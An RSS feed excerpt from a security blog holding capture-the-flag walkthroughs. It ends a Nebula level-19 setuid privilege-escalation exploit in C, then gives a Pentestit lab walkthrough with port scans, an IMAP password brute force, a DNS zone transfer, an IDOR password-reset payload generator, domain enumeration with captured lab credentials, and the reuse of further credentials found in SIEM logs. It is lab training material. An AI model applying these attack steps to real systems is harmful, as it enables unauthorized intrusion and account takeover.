  snprintf(buf, sizeof(buf)-1, &quot;/proc/%d&quot;, getppid());

  /* stat() it */

  if(stat(buf, &amp;amp;statbuf) == -1) {
      printf(&quot;Unable to check parent process\n&quot;);
      exit(EXIT_FAILURE);
  }

  /* check the owner id */

  if(statbuf.st_uid == 0) {
      /* If root started us, it is ok to start the shell */

      execve(&quot;/bin/sh&quot;, argv, envp);
      err(1, &quot;Unable to execve&quot;);
  }

  printf(&quot;You are unauthorized to run this program\n&quot;);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;By looking at the above program, it executes a shell if the parent process was started by root. Within the program itself, &lt;code class=&quot;highlighter-rouge&quot;&gt;getppid&lt;/code&gt; is used to achieve this. &lt;code class=&quot;highlighter-rouge&quot;&gt;getppid&lt;/code&gt; returns the pid of the parent of the calling process is what defines whether a shell should be given or not. &lt;code class=&quot;highlighter-rouge&quot;&gt;getppid&lt;/code&gt; returns the PID of init e.g. 1 and &lt;code class=&quot;highlighter-rouge&quot;&gt;/proc/1&lt;/code&gt; is owned by root. The way to solve this challenge is to kill the parent process which called the flag19 program before the program calls &lt;code class=&quot;highlighter-rouge&quot;&gt;getppid&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;unistd.h&amp;gt;

int main(int argc, char **argv, char **envp) {
    int childPID = fork();
    if(childPID &amp;gt;= 0) { // forked
        if(childPID == 0) { // child
            sleep(1);
            setresuid(geteuid(),geteuid(),geteuid());
            char *args[] = {&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;/bin/getflag&quot;, NULL};
            execve(&quot;/home/flag19/flag19&quot;, args, envp);
        }
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The above program creates a process using &lt;code class=&quot;highlighter-rouge&quot;&gt;fork&lt;/code&gt;. Fork system call is used for creating a new process, which is called child process, which runs concurrently with the process that makes the fork() call (parent process). After a new child process is created, both processes will execute the next instruction following the fork() system call. sleep is then used to force create an orphan process that would be claimed by init, which is owned by root. Then the &lt;code class=&quot;highlighter-rouge&quot;&gt;exec&lt;/code&gt; call is done to run the flag19 program which is execute the getflag command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/level19.png&quot; alt=&quot;alt text&quot; title=&quot;level19&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This brings to the end Exploit Exercises Nebula. Overall, the challenges were great fun and difficulty increased throughout and required me to look at multiple writeups online to complete this.&lt;/p&gt;
</description>
        <pubDate>Sat, 08 Jun 2019 10:00:00 +0100</pubDate>
        <link>http://snoopysecurity.github.io/capture_the_flag/2019/06/08/10_Exploit_Education_Nebula_Walkthrough.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/capture_the_flag/2019/06/08/10_Exploit_Education_Nebula_Walkthrough.html</guid>
        
        
        <category>capture_the_flag</category>
        
      </item>
    
      <item>
        <title>Pentestit TestLab V12 Walkthrough</title>
        <description>&lt;p&gt;This walkthrough shows the process I used to capture and complete some systems within the Pentestit v12 test lab. This walkthrough contains my field notes I took when I was working through the box. The “Test lab” is presented as a computer network of virtual companies containing widely of distributed misconfigurations and vulnerabilities. Players will need to discover vulnerable hosts, exploit them and then find the token.&lt;/p&gt;

&lt;h3 id=&quot;mail-token&quot;&gt;Mail Token&lt;/h3&gt;

&lt;p&gt;The first step consists of the reconnaissance phase as ports scanning, banner grabbing, misconfigurations and so on. Once you create a free account, Pentestit will provide you a VPN configuration which you can then use to connect to the TestLab network. Once connected, the Lab gateways are &lt;strong&gt;192.168.101.12&lt;/strong&gt; and &lt;strong&gt;192.168.101.13&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;A port scan of the .12 system shows the following services open.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:# nmap -sV 192.168.101.12 -T4 -p- -vv

Completed Service scan at 13:58, 8.28s elapsed (4 services on 1 host)
NSE: Script scanning 192.168.101.12.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 13:58
Completed NSE at 13:58, 1.49s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 13:58
Completed NSE at 13:58, 0.00s elapsed
Nmap scan report for site.test.lab (192.168.101.12)
Host is up, received echo-reply ttl 62 (0.12s latency).
Scanned at 2019-01-19 13:53:27 EST for 329s
Not shown: 65531 filtered ports
Reason: 65531 no-responses
PORT     STATE SERVICE REASON         VERSION
25/tcp   open  smtp    syn-ack ttl 61 Postfix smtpd
80/tcp   open  http    syn-ack ttl 61 nginx 1.14.2
143/tcp  open  imap    syn-ack ttl 61 Dovecot imapd
8080/tcp open  http    syn-ack ttl 61 nginx
Service Info: Host: -mail.test.lab

Read data files from: /usr/bin/../share/nmap
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Browsing to port 80 shows a WordPress site in use and a Roundcube Webmail instance was discoverable on port 8080. After quickly discovering the virtual host is called site.test.lab, the /etc/hosts file can be modified to include this information. WPScan can be used to enumerate the WordPress installation&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:# wpscan --url http://site.test.lab --random-user-agent
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 3.3.1
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[+] URL: http://site.test.lab/
[+] Started: Fri Jan 18 18:18:44 2019

Interesting Finding(s):

[+] http://site.test.lab/
 | Interesting Entry: Server: nginx/1.14.2
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://site.test.lab/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 4.9.8 identified.
 | Detected By: Rss Generator (Passive Detection)
 |  - http://site.test.lab/?feed=rss2, &amp;lt;generator&amp;gt;https://wordpress.org/?v=4.9.8&amp;lt;/generator&amp;gt;
 |  - http://site.test.lab/?feed=comments-rss2, &amp;lt;generator&amp;gt;https://wordpress.org/?v=4.9.8&amp;lt;/generator&amp;gt;
 |
 | [!] 7 vulnerabilities identified:
 |
 | [!] Title: WordPress &amp;lt;= 5.0 - Authenticated File Delete
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9169
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress &amp;lt;= 5.0 - Authenticated Post Type Bypass
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9170
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/
 |
 | [!] Title: WordPress &amp;lt;= 5.0 - PHP Object Injection via Meta Data
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9171
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress &amp;lt;= 5.0 - Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9172
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress &amp;lt;= 5.0 - Cross-Site Scripting (XSS) that could affect plugins
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9173
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460
 |
 | [!] Title: WordPress &amp;lt;= 5.0 - User Activation Screen Search Engine Indexing
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9174
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress &amp;lt;= 5.0 - File Upload to XSS on Apache Web Servers
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9175
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a

[+] WordPress theme in use: twentyseventeen
 | Location: http://site.test.lab/wp-content/themes/twentyseventeen/
 | Last Updated: 2019-01-09T00:00:00.000Z
 | Readme: http://site.test.lab/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.0
 | Style URL: http://site.test.lab/wp-content/themes/twentyseventeen/style.css?ver=4.9.8
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Detected By: Css Style (Passive Detection)
 |
 | Version: 1.7 (80% confidence)
 | Detected By: Style (Passive Detection)
 |  - http://site.test.lab/wp-content/themes/twentyseventeen/style.css?ver=4.9.8, Match: 'Version: 1.7'

[+] Enumerating All Plugins
[+] Checking Plugin Versions

[i] Plugin(s) Identified:

[+] wp-survey-and-poll
 | Location: http://site.test.lab/wp-content/plugins/wp-survey-and-poll/
 | Last Updated: 2019-01-14T22:50:00.000Z
 | [!] The version is out of date, the latest version is 1.5.8
 |
 | Detected By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.5.7.8 (50% confidence)
 | Detected By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://site.test.lab/wp-content/plugins/wp-survey-and-poll/readme.txt

[+] Enumerating Config Backups
 Checking Config Backups - Time: 00:00:00 &amp;lt;===============================================================================================&amp;gt; (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Finished: Fri Jan 18 18:18:52 2019
[+] Requests Done: 53
[+] Memory used: 60.688 MB
[+] Elapsed time: 00:00:07
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Spidering of the application also revealed additional information regarding the themes and plugins in use. However, these were found hard to exploit due to the use of a Web Application Firewall within the WordPress application. However, by looking at the main WordPress webpage. It was possible to identify a email/username.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/1.JPG&quot; alt=&quot;alt text&quot; title=&quot;wordpressuser&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using this username, brute force attacks can now be conducted to possibly get access to to to the Roundcube Webmail instance, WordPress dashboard, or the IMAP. After trying all three potential targets, the password of the info user was successfully brute forced by leveraging the IMAP service.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/# hydra -l info@test.lab -P /root/rockyou.txt imap://192.168.101.12/PLAIN
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2019-01-19 14:08:43
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking imap://192.168.101.12:143/PLAIN
[143][imap] host: 192.168.101.12   login: info@test.lab   password: 123456789
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (http://www.thc.org/thc-hydra) finished at 2019-01-19 14:08:50
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Using the found password, it was possible to successfully login to the Roundcube Webmail as the &lt;strong&gt;info&lt;/strong&gt; user.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/2.JPG&quot; alt=&quot;alt text&quot; title=&quot;roundcube&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking through the info user’s emails, it was possible to find the Mail token, and get hold of a VPN configuration file. A possible username called &lt;strong&gt;sviridov@test.lab&lt;/strong&gt; was also found my looking through the inbox.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/3.JPG&quot; alt=&quot;alt text&quot; title=&quot;vpnconfig&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;dns-token&quot;&gt;DNS Token&lt;/h3&gt;

&lt;p&gt;Using the found credentials and the VPN config file, a VPN connection can be established and tunnelled through the already established VPN connection. This can be done as seen below&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/4.JPG&quot; alt=&quot;alt text&quot; title=&quot;secondvpnconnection&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By looking around, the new subnet that is accessible seems to be &lt;code class=&quot;highlighter-rouge&quot;&gt;172.16.0.0/16&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:# ip ro show dev tun1
10.11.0.1 via 10.11.0.25 
10.11.0.25 proto kernel scope link src 10.11.0.26 
172.16.0.0/16 via 10.11.0.25 
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;A nmap scan with the fast (-F) option can be conducted to quickly find open services. It is worth disabling host discovery within nmap for better coverage.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap -F -n 172.16.0.0/16 -v -Pn
[SHORTENED FOR ABBREVIATION]

Nmap scan report for 172.16.0.10
Host is up (0.10s latency).
Not shown: 99 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 172.16.0.17
Host is up (0.10s latency).
Not shown: 89 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
143/tcp  open  imap
389/tcp  open  ldap
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy

Nmap scan report for 172.16.2.10
Host is up (0.051s latency).
Not shown: 99 filtered ports
PORT   STATE SERVICE
53/tcp open  domain


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The results discovered multiple DNS servers. One of these DNS servers allowed zone transfers.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:# dig axfr test.lab @172.16.2.10

; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.11.4-P2-3-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; axfr test.lab @172.16.2.10
;; global options: +cmd
test.lab.		21600	IN	SOA	test.lab. ad.test.lab. 69 5 30 21600 60
test.lab.		21600	IN	NS	ns1.test.lab.
test.lab.		21600	IN	NS	ns2.test.lab.
test.lab.		21600	IN	A	172.16.0.17
_kerberos._tcp.dc._msdcs.test.lab. 21600 IN SRV	0 0 88 test.lab.
_ldap._tcp.dc._msdcs.test.lab. 21600 IN	SRV	0 0 389 test.lab.
gc._msdcs.test.lab.	21600	IN	A	172.16.0.17
_ldap._tcp.gc._msdcs.test.lab. 21600 IN	SRV	0 0 3268 test.lab.
_kerberos._tcp.test.lab. 21600	IN	SRV	0 0 88 test.lab.
_kpasswd._tcp.test.lab.	21600	IN	SRV	0 0 464 test.lab.
_ldap._tcp.test.lab.	21600	IN	SRV	0 0 389 test.lab.
_kerberos._udp.test.lab. 21600	IN	SRV	0 0 88 test.lab.
_kpasswd._udp.test.lab.	21600	IN	SRV	0 0 464 test.lab.
ad.test.lab.		21600	IN	A	172.16.0.17
db.test.lab.		21600	IN	A	172.16.0.30
dc.test.lab.		21600	IN	A	172.16.0.17
dns.test.lab.		21600	IN	A	172.16.0.17
dns.test.lab.		21600	IN	A	172.16.2.10
_ldap._tcp.ForestDnsZones.test.lab. 21600 IN SRV 0 0 389 test.lab.
helpdesk.test.lab.	21600	IN	A	172.16.0.10    
my.test.lab.		21600	IN	A	172.16.0.10
ns1.test.lab.		21600	IN	A	172.16.0.17
ns2.test.lab.		21600	IN	A	172.16.2.10
site.test.lab.		21600	IN	A	172.16.0.10
[TOKENREMOVEDFROM].test.lab. 21600 IN	A	127.0.0.1
test.lab.		21600	IN	SOA	test.lab. ad.test.lab. 69 5 30 21600 60
;; Query time: 169 msec
;; SERVER: 172.16.2.10#53(172.16.2.10)
;; WHEN: Sat Jan 19 18:14:26 EST 2019
;; XFR size: 26 records (messages 1, bytes 778
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The DNS token was discovered within the given results.&lt;/p&gt;

&lt;h3 id=&quot;helpdesk-token&quot;&gt;Helpdesk Token&lt;/h3&gt;

&lt;p&gt;The IP address and the correct hostname for the helpdesk system can be discovered through the obtain DNS records. A quick port scan revealed that this machine is hosting a web application&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/5.JPG&quot; alt=&quot;alt text&quot; title=&quot;helpdesk&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The previously obtained info user credentials can be used to login in to this application&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/6.png&quot; alt=&quot;alt text&quot; title=&quot;helpdesk&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Observing the change password area of the helpdesk discovered the use of an obfuscated ID parameter which could potentially be vulnerable to Insecure Direct Object Reference.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/6.JPG&quot; alt=&quot;alt text&quot; title=&quot;changepass&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The value of the ID parameter was found to be Base64 decoded. An decoded example of this value can be seen below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/7.JPG&quot; alt=&quot;alt text&quot; title=&quot;changepass&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By iterating through a list of parameter values, it could be possible to reset the password for the sviridov user. It should be noted that to generate valid values for the ID parameter, a list of numbers should be generate with a new line at the end. The following PHP code can be used to generate these values.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php  
for ($x = 0; $x &amp;lt;= 500; $x++) {
    echo base64_encode($x.'
');
    echo '&amp;lt;br&amp;gt;';
}
?&amp;gt;  
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This payload list can now be used with Burp Intruder to reset the password of the sviridov user.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/8.JPG&quot; alt=&quot;alt text&quot; title=&quot;intruder&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The helpdesk token and the network password of the sviridov user can be found by logging in to the Helpdesk application with the changed password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/9.JPG&quot; alt=&quot;alt text&quot; title=&quot;sviridov&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ad-token&quot;&gt;AD Token&lt;/h3&gt;

&lt;p&gt;The domain controller IP address in use for the TEST domain can be found by looking through the DNS records found earlier through the DNS Zone transfer. By conducting a authenticated NetBIOS using enum4linux, information about the domain can be gathered including the AD token.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/var/www/html# enum4linux -u 'sviridov@test.lab' -p '5BEiBBtrNq695A!6u5zUR5KxC' -U 172.16.0.17 -a
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jan 27 10:02:59 2019

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 172.16.0.17
RID Range ........ 500-550,1000-1050
Username ......... 'sviridov@test.lab'
Password ......... '5BEiBBtrNq695A!6u5zUR5KxC'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =================================================== 
|    Enumerating Workgroup/Domain on 172.16.0.17    |
 =================================================== 
[+] Got domain/workgroup name: TEST

 ==================================== 
|    Session Check on 172.16.0.17    |
 ==================================== 
[+] Server 172.16.0.17 allows sessions using username 'sviridov@test.lab', password '5BEiBBtrNq695A!6u5zUR5KxC'

 ========================================== 
|    Getting domain SID for 172.16.0.17    |
 ========================================== 
Domain Name: TEST
Domain Sid: S-1-5-21-583374519-1042395902-3096671009
[+] Host is part of a domain (not a workgroup)

 ============================ 
|    Users on 172.16.0.17    |
 ============================ 
index: 0x1 RID: 0x45e acb: 0x00000010 Account: token_fopekr0mf	Name: 	Desc: 
index: 0x2 RID: 0x1f4 acb: 0x00000010 Account: Administrator	Name: 	Desc: Built-in account for administering the computer/domain
index: 0x3 RID: 0x457 acb: 0x00000010 Account: lomonosov	Name: 	Desc: 
index: 0x4 RID: 0x452 acb: 0x00000010 Account: sviridov	Name: 	Desc: 
index: 0x5 RID: 0x454 acb: 0x00000010 Account: sidorov	Name: 	Desc: 
index: 0x6 RID: 0x1f6 acb: 0x00000011 Account: krbtgt	Name: 	Desc: Key Distribution Center Service Account
index: 0x7 RID: 0x456 acb: 0x00000010 Account: petrov	Name: 	Desc: 
index: 0x8 RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: 	Desc: Built-in account for guest access to the computer/domain
index: 0x9 RID: 0x450 acb: 0x00000010 Account: info	Name:  info	Desc: 

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[info] rid:[0x450]
user:[sviridov] rid:[0x452]
user:[sidorov] rid:[0x454]
user:[petrov] rid:[0x456]
user:[lomonosov] rid:[0x457]
user:[token_fopekr0mf] rid:[0x45e]
enum4linux complete on Sun Jan 27 10:03:06 2019

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vpn-token&quot;&gt;VPN Token&lt;/h3&gt;

&lt;p&gt;The initial information provided by Pentestit was that lab gateways are &lt;strong&gt;192.168.101.12&lt;/strong&gt; and &lt;strong&gt;192.168.101.13&lt;/strong&gt;. 192.168.101.13 was accessible by downloading the VPN configuration obtained through the mail token challenge.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/10.JPG&quot; alt=&quot;alt text&quot; title=&quot;secondvpn&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The VPN configuration can be modified to connect to the 192.168.101.12 VPN. The sviridov credentials previously obtained will need to be used for successful authentication.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# ip ro show dev tun1
10.12.0.1 via 10.12.0.145 
10.12.0.145 proto kernel scope link src 10.12.0.146 
172.16.0.0/16 via 10.12.0.145 
192.168.0.0/24 via 10.12.0.145
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The same 172 network range seems to be accessible but network Access Control Lists might not been in place. A port scan of this range revealed the following systems&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Host is up, received user-set (0.074s latency).
Scanned at 2019-01-27 13:20:40 EST for 66s
Not shown: 99 filtered ports
Reason: 99 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

Nmap scan report for 172.16.0.11
Host is up, received user-set (0.058s latency).
Scanned at 2019-01-27 13:20:40 EST for 68s
Not shown: 98 filtered ports
Reason: 98 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
25/tcp  open  smtp    syn-ack
143/tcp open  imap    syn-ack

Nmap scan report for 172.16.0.14
Host is up, received user-set (0.076s latency).
Scanned at 2019-01-27 13:20:40 EST for 67s
Not shown: 98 filtered ports
Reason: 98 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Nmap scan report for 172.16.0.17
Host is up, received user-set (0.067s latency).
Scanned at 2019-01-27 13:20:40 EST for 62s
Not shown: 75 closed ports, 19 filtered ports
Reason: 75 conn-refused and 19 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack
53/tcp  open  domain       syn-ack
135/tcp open  msrpc        syn-ack
139/tcp open  netbios-ssn  syn-ack
389/tcp open  ldap         syn-ack
445/tcp open  microsoft-ds syn-ack

Nmap scan report for 172.16.1.10
Host is up, received user-set (0.080s latency).
Scanned at 2019-01-27 14:26:04 EST for 180s
Not shown: 99 filtered ports
Reason: 99 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

Nmap scan report for 172.16.1.12
Host is up, received user-set (0.063s latency).
Scanned at 2019-01-27 14:26:04 EST for 179s
Not shown: 98 filtered ports
Reason: 98 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Nmap scan report for 172.16.1.15
Host is up, received user-set (0.068s latency).
Scanned at 2019-01-27 14:26:04 EST for 182s
Not shown: 99 filtered ports
Reason: 99 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

Nmap scan report for 172.16.1.20
Host is up, received user-set (0.087s latency).
Scanned at 2019-01-27 14:26:04 EST for 179s
Not shown: 98 filtered ports
Reason: 98 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack
8000/tcp open  http-alt syn-ack

Nmap scan report for 172.16.1.25
Host is up, received user-set (0.15s latency).
Scanned at 2019-01-27 14:26:04 EST for 177s
Not shown: 99 filtered ports
Reason: 99 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Browsing to port 80 using a web browser revealed the following token&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/11.JPG&quot; alt=&quot;alt text&quot; title=&quot;vpnhost&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;siem-token&quot;&gt;SIEM Token&lt;/h3&gt;

&lt;p&gt;By browsing to the IP 172.16.1.12 found from the previous Nmap scan, a prewikka prelude SIEM console can be discovered. By trying the previously found credentials for sviridov, authentication to this console was successful.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/12.jpg&quot; alt=&quot;alt text&quot; title=&quot;prewikka1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking through the console, and by looking at logs from previous 6 months, a few things can be concluded:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The IP address of the repository (repository.test.lab) system is 172.16.1.15&lt;/li&gt;
  &lt;li&gt;The IP address 172.16.1.10 belongs to vpn-admin.test.lab&lt;/li&gt;
  &lt;li&gt;The correct domain name for the SIEM system is siem.test.lab&lt;/li&gt;
  &lt;li&gt;The agents running to obtain SIEM data are both disabled&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;An overview of these logs can be seen below&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/13.jpg&quot; alt=&quot;alt text&quot; title=&quot;prewikka1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The token for SIEM can be found under the additional data section for the “User missed the password to change UID (user id)” alert belonging to the Repository system.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/14.jpg&quot; alt=&quot;alt text&quot; title=&quot;prewikka2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another interesting alert “Unknown problem somewhere in the system” also gives information regarding a user and potential password for the repository system.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/15.jpg&quot; alt=&quot;alt text&quot; title=&quot;prewikka3&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;repository-token&quot;&gt;Repository Token&lt;/h3&gt;

&lt;p&gt;Using the found credentials from the previous SIEM log, access to the repository system can be obtained using the “admin:IFGpajdlkmaw2of” credentials.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/16.jpg&quot; alt=&quot;alt text&quot; title=&quot;repository1&quot; /&gt;&lt;/p&gt;

